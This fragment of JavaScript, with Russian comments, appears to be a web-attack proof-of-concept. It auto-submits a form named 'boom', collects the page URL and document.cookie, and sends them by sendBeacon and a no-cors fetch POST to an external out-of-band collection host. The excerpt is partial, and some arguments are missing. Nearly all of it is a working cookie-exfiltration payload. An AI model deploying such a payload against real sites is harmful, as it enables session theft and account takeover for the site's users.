  document.getElementById('boom').submit();

  // ждём и смотрим, куда нас закинуло (редирект? ошибка? новая страница?)

      url: window.location.href,

      cookie: document.cookie || "no visible cookie"
    };

    navigator.sendBeacon(

      JSON.stringify(data)
    );
    // или классический fetch с no-cors
    fetch("https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun", {
      method: "POST",
      mode: "no-cors",
      keepalive: true,
      body: JSON.stringify(data)

</script>
